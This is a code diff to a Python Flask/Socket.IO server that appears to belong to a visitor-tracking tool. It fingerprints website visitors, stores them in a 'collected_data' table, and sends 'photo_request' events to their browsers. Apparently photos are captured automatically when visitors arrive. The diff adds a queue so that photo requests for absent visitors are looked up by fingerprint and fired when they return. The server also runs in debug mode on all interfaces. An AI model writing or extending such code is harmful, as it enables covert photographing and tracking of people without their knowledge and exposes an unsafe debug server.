@@ -867,6 +867,8 @@ def serve_photo(filename):
 # WebSocket handlers for photo requests
 # Store active users: {entry_id: {socket_id: sid, fingerprint: fp}}
 active_users = {}
+# Store pending photo requests: {entry_id: [request_data, ...]}
+pending_photo_requests = {}
 
 @socketio.on('connect')
 def handle_connect():
@@ -897,6 +899,20 @@ def handle_register_user(data):
         }
         join_room(f'user_{entry_id}')
         print(f"[WEBSOCKET] Registered user entry {entry_id} with fingerprint {fingerprint[:16]}...")
+        
+        # Check if there are any pending photo requests for this user
+        if entry_id in pending_photo_requests:
+            # Send all pending requests
+            for request_data in pending_photo_requests[entry_id]:
+                emit('photo_request', {
+                    'entry_id': entry_id,
+                    'fingerprint': fingerprint,
+                    'requested_at': request_data.get('requested_at', datetime.now().isoformat())
+                }, room=f'user_{entry_id}')
+                print(f"[WEBSOCKET] Sent pending photo request to entry {entry_id}")
+            # Clear pending requests
+            del pending_photo_requests[entry_id]
+        
         emit('user_registered', {'entry_id': entry_id, 'status': 'success'})
     else:
         emit('registration_error', {'error': 'Entry ID required'})
@@ -928,11 +944,12 @@ def handle_request_photo(data):
     
     if target_socket_id and target_entry_id:
         # Send photo request to the user
-        emit('photo_request', {
+        request_data = {
             'entry_id': target_entry_id,
             'fingerprint': fingerprint,
             'requested_at': datetime.now().isoformat()
-        }, room=f'user_{target_entry_id}')
+        }
+        emit('photo_request', request_data, room=f'user_{target_entry_id}')
         print(f"[WEBSOCKET] Photo request sent to entry {target_entry_id}")
         emit('photo_requested', {
             'entry_id': target_entry_id,
@@ -940,12 +957,43 @@ def handle_request_photo(data):
             'message': 'Photo request sent to user'
         })
     else:
-        error_msg = f"User not found or not online (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
-        print(f"[WEBSOCKET] {error_msg}")
-        emit('photo_request_error', {
-            'error': error_msg,
-            'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
-        })
+        # User not online - store request as pending
+        # Try to find entry_id by fingerprint if not provided
+        if not entry_id and fingerprint:
+            # Search database for entry with this fingerprint
+            try:
+                conn = sqlite3.connect(DB_PATH)
+                c = conn.cursor()
+                c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
+                result = c.fetchone()
+                conn.close()
+                if result:
+                    entry_id = result[0]
+            except Exception as e:
+                print(f"[WEBSOCKET] Error looking up fingerprint: {e}")
+        
+        if entry_id:
+            # Store as pending request
+            if entry_id not in pending_photo_requests:
+                pending_photo_requests[entry_id] = []
+            pending_photo_requests[entry_id].append({
+                'entry_id': entry_id,
+                'fingerprint': fingerprint,
+                'requested_at': datetime.now().isoformat()
+            })
+            print(f"[WEBSOCKET] User not online, stored pending photo request for entry {entry_id}")
+            emit('photo_requested', {
+                'entry_id': entry_id,
+                'status': 'pending',
+                'message': 'Photo request stored. Will be sent when user comes online.'
+            })
+        else:
+            error_msg = f"User not found (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
+            print(f"[WEBSOCKET] {error_msg}")
+            emit('photo_request_error', {
+                'error': error_msg,
+                'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
+            })
 
 if __name__ == '__main__':
     socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
